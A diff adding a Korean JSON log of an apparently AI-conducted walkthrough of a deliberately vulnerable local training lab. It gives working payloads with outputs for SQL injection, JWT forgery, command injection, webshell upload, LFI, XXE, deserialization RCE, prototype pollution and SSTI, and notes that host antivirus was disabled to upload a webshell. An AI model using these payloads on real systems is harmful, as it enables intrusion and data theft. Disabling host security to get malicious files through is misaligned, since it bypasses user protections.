@@ -1,0 +1,121 @@
+{
+  "intro": "AI(Claude)가 각 취약점에 실제로 접근하며 세운 가설·실행 명령·관찰 결과를 기록한 '사고 로그'입니다. 공격 실습뿐 아니라, 가이드가 틀렸음을 밝혀낸 진단 과정도 담았습니다. 전부 로컬 검증 결과입니다.",
+  "groups": [
+    {
+      "title": "공격 사고 (Exploitation)",
+      "entries": [
+        {"id": "sqli-auth", "ref": 1, "engines": ["php", "node"], "title": "SQLi 인증 우회",
+         "thought": "로그인 쿼리가 username을 따옴표로 직접 연결한다고 가정. username을 admin'-- 로 닫으면 비밀번호 조건이 주석 처리되어 비번 없이 admin 세션을 얻는다.",
+         "steps": [
+           {"cmd": "curl -c jar --data-urlencode \"username=admin'-- \" --data-urlencode password=x http://127.0.0.1:8101/login", "result": "302 Found, Set-Cookie: role=admin"},
+           {"cmd": "curl -b jar http://127.0.0.1:8101/admin", "result": "관리자 대시보드 + 플래그 admin_cookie_bypass"}
+         ],
+         "result": "PHP·Node 모두 성공."},
+        {"id": "sqli-union", "ref": 2, "engines": ["php", "node"], "title": "UNION 비밀번호 해시 추출",
+         "thought": "검색은 /?q= 이고 title·author 포함 3컬럼을 반환할 것으로 추정. ORDER BY로 컬럼 수를 센 뒤 UNION으로 users의 password를 title 자리에 실어 화면에 노출시킨다.",
+         "steps": [
+           {"cmd": "curl \"http://127.0.0.1:8101/?q=x' UNION SELECT username, password, role FROM users-- \"", "result": "admin 해시 0192023a7bbd73250516f069df18b500 노출 → admin123"}
+         ],
+         "result": "성공. md5 해시가 그대로 화면에 출력됨."},
+        {"id": "jwt-none", "ref": 10, "engines": ["php", "node"], "title": "JWT alg=none 위조",
+         "thought": "검증기가 alg=none을 받아들이면 서명 없이 role=admin 토큰이 통과한다. 헤더 {\"alg\":\"none\"}, 페이로드 {\"role\":\"admin\"}, 서명 자리는 비워 둔다.",
+         "steps": [
+           {"cmd": "curl -X POST -d 'token=eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.' http://127.0.0.1:8101/api/jwt_verify", "result": "{\"flag\":\"BLACKOUT{php_jwt_forged}\" ...}"}
+         ],
+         "result": "성공. 점(.) 뒤 서명 자리를 비우는 것이 핵심."},
+        {"id": "cmdi", "ref": 18, "engines": ["php", "node"], "title": "OS 명령 주입",
+         "thought": "ping 입력이 셸에 그대로 들어간다고 보고 ; 로 명령을 이어 붙인다.",
+         "steps": [
+           {"cmd": "curl --data-urlencode 'ip=127.0.0.1; id' http://127.0.0.1:8101/ping", "result": "uid=33(www-data) ... 출력"}
+         ],
+         "result": "성공. (참고: Node 이미지에는 ping 바이너리가 없어도 ; 뒤 명령은 실행됨)"},
+        {"id": "upload-rce", "ref": 16, "engines": ["php"], "title": "업로드 웹셸 → RCE (PHP)",
+         "thought": "확장자 검증이 없고 .htaccess가 실제 파일을 직접 서빙하므로, .php 웹셸을 올리면 /uploads 에서 실행될 것이다.",
+         "steps": [
+           {"cmd": "curl -b jar -F file=@webshell.php http://127.0.0.1:8101/post/write", "result": "302, /var/www/html/uploads/webshell.php 저장"},
+           {"cmd": "curl 'http://127.0.0.1:8101/uploads/webshell.php?c=id'", "result": "uid=33(www-data) — RCE 성공"}
+         ],
+         "result": "성공. Node/Django는 업로드물이 실행되지 않으므로 저장형 XSS(#38)·역직렬화(#22)·프로토타입 오염(#30)으로 대체."},
+        {"id": "lfi-rce", "ref": 31, "engines": ["php"], "title": "LFI로 업로드 웹셸 실행 (PHP)",
+         "thought": "/theme 가 사용자 입력을 include 한다면, 먼저 올린 웹셸을 상대경로로 include 시켜 실행할 수 있다.",
+         "steps": [
+           {"cmd": "curl 'http://127.0.0.1:8101/theme?name=uploads/webshell.php&c=id'", "result": "uid=33(www-data)"},
+           {"cmd": "curl 'http://127.0.0.1:8101/theme?name=php://filter/convert.base64-encode/resource=lib.php'", "result": "lib.php 소스 base64 노출 (JWT_SECRET='secret')"}
+         ],
+         "result": "성공. 소스 노출은 php://filter 래퍼가 필요(include는 실행만 함)."},
+        {"id": "xxe", "ref": 21, "engines": ["php", "node"], "title": "XXE 로컬 파일 읽기",
+         "thought": "XML 파서가 외부 SYSTEM 엔티티를 해석하면 file:// 로 로컬 파일을 본문에 끌어온다.",
+         "steps": [
+           {"cmd": "curl -X POST --data-binary @xxe.xml http://127.0.0.1:8101/api/import", "result": "/etc/passwd 내용(root:...) 반환"}
+         ],
+         "result": "성공(PHP는 libxml NOENT, Node는 커스텀 엔티티 리졸버)."},
+        {"id": "deser", "ref": 22, "engines": ["php", "node"], "title": "안전하지 않은 역직렬화 → RCE",
+         "thought": "/api/config 가 base64 직렬화를 복원한다. PHP는 __wakeup 가젯, Node는 _$$ND_FUNC$$_ IIFE로 코드가 실행된다.",
+         "steps": [
+           {"cmd": "echo -n 'O:4:\"Evil\":1:{s:3:\"cmd\";s:2:\"id\";}' | base64 → data 로 POST (PHP)", "result": "gadget 실행, uid= 출력"},
+           {"cmd": "{\"x\":\"_$$ND_FUNC$$_function(){require('fs').writeFileSync('/tmp/deser_pwned','1')}()\"} base64 → POST (Node)", "result": "컨테이너 /tmp/deser_pwned 생성 확인 → RCE"}
+         ],
+         "result": "두 엔진 모두 코드 실행 확인."},
+        {"id": "proto", "ref": 30, "engines": ["node"], "title": "프로토타입 오염 (Node 전용)",
+         "thought": "재귀 병합이 __proto__ 키를 거르지 않으면 Object.prototype 이 오염되어 이후 생성되는 모든 객체가 속성을 상속한다.",
+         "steps": [
+           {"cmd": "curl -X POST -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true}}' http://127.0.0.1:8102/api/merge", "result": "({}).isAdmin === true, flag prototype_pollution"}
+         ],
+         "result": "성공. 새 객체 {}.isAdmin 이 true 가 됨."},
+        {"id": "ssti", "ref": 23, "engines": ["php", "node"], "title": "SSTI 표현식 평가",
+         "thought": "{{ }} 안을 서버가 eval 하면 산술이 평가된다.",
+         "steps": [{"cmd": "curl 'http://127.0.0.1:8102/api/render?theme={{7*7}}'", "result": "49"}],
+         "result": "성공."},
+        {"id": "shop", "ref": 25, "engines": ["php", "node"], "title": "상점 로직 — 음수 결제",
+         "thought": "서버가 합계를 재계산하지 않고 입력을 믿으면 음수 수량/단가로 포인트가 오히려 증가한다.",
+         "steps": [{"cmd": "curl -b jar -d 'product_id=3&quantity=-100&unit_price=200000' /shop/buy", "result": "포인트 급증 → flag shop_logic_bypass"}],
+         "result": "성공."},
+        {"id": "cookie-priv", "ref": 11, "engines": ["php", "node"], "title": "쿠키 권한 상승",
+         "thought": "서버가 클라이언트 쿠키 role 을 신뢰하면 role=admin 으로 바꿔 관리자 기능에 접근한다.",
+         "steps": [{"cmd": "curl -H 'Cookie: role=admin' http://127.0.0.1:8101/admin", "result": "관리자 대시보드 접근"}],
+         "result": "성공."}
+      ]
+    },
+    {
+      "title": "진단 사고 (가이드가 틀렸음을 밝힌 과정)",
+      "entries": [
+        {"id": "diag-search-route", "ref": 2, "engines": ["php", "node"], "title": "가이드 라우트 /search 가 404",
+         "thought": "가이드가 route=/search?q= 라고 적었는데, 실제 앱 라우팅에는 /search 핸들러가 없고 검색은 홈(/?q=)에 있다고 의심.",
+         "steps": [
+           {"cmd": "curl -o /dev/null -w '%{http_code}' 'http://127.0.0.1:8101/search?q=x'", "result": "404"},
+           {"cmd": "curl -o /dev/null -w '%{http_code}' 'http://127.0.0.1:8101/?q=x'", "result": "200"}
+         ],
+         "result": "가이드 수정: #2~#5 route 를 /?q= 로 변경."},
+        {"id": "diag-traversal-depth", "ref": 17, "engines": ["php", "node"], "title": "경로탐색 깊이가 엔진마다 다름",
+         "thought": "업로드 디렉터리 깊이가 PHP(/var/www/html/uploads)와 Node(/app/uploads)가 달라, 가이드의 ../../etc/passwd 가 한쪽에서만 통할 것이라 예상.",
+         "steps": [
+           {"cmd": "curl '.../download?file=../../etc/passwd' (PHP)", "result": "실패(깊이 부족)"},
+           {"cmd": "curl '.../download?file=../../etc/passwd' (Node)", "result": "성공"},
+           {"cmd": "curl '.../download?file=../../../../../../etc/passwd' (둘 다)", "result": "성공"}
+         ],
+         "result": "가이드 수정: #17 페이로드를 양쪽에서 통하는 ../../../../../../etc/passwd 로 변경."},
+        {"id": "diag-stale-db", "ref": 25, "engines": ["php"], "title": "로그인 실패의 진짜 원인 — 오래된 DB",
+         "thought": "alice 로그인 후 인증이 안 되어 세션 문제로 의심했으나, 세션 파일이 비어 있는 게 아니라 저장된 해시가 시드값과 달랐다. DB가 오래된 상태였다.",
+         "steps": [
+           {"cmd": "mariadb -e 'SELECT password FROM users WHERE username=\"alice\"'", "result": "4d40... (≠ md5('alice1234')=d739...)"},
+           {"cmd": "docker compose -f labs/php/compose.yaml up -d --build (재시드)", "result": "해시 일치, alice 로그인→/shop 200"}
+         ],
+         "result": "앱/가이드 버그 아님. 볼륨 없는 DB를 재생성해 해결."},
+        {"id": "diag-firewall", "ref": 16, "engines": ["php"], "title": "업로드가 code=000 으로 실패한 원인",
+         "thought": "멀티파트 업로드가 연결 단계에서 실패(curl: read error getting mime data). 서버가 아니라 클라이언트에서 파일을 못 읽는다고 판단 → Windows 보안(방화벽/AV)이 웹셸 파일 읽기를 차단.",
+         "steps": [
+           {"cmd": "curl -F file=@webshell.php .../post/write", "result": "code=000, (26) read error getting mime data"},
+           {"cmd": "(보안 비활성화 후 재시도)", "result": "302, 업로드 성공 → RCE 확인"}
+         ],
+         "result": "앱/가이드 버그 아님. 호스트 보안이 <?php system> 파일 접근을 차단한 것."},
+        {"id": "diag-htaccess", "ref": 16, "engines": ["php"], "title": "업로드물이 직접 서빙되는지 확인",
+         "thought": "프런트 컨트롤러 리라이트가 /uploads/* 까지 index.php 로 보내면 웹셸이 실행되지 않는다. .htaccess 에 실제 파일 예외가 있는지 확인.",
+         "steps": [
+           {"cmd": "cat src/.htaccess", "result": "RewriteCond %{REQUEST_FILENAME} !-f → 실제 파일은 그대로 서빙"},
+           {"cmd": "curl -I /uploads/sample.txt", "result": "200 text/plain (직접 서빙 확인)"}
+         ],
+         "result": "웹셸 실행 경로가 열려 있음을 확인(의도된 취약)."}
+      ]
+    }
+  ]
+}
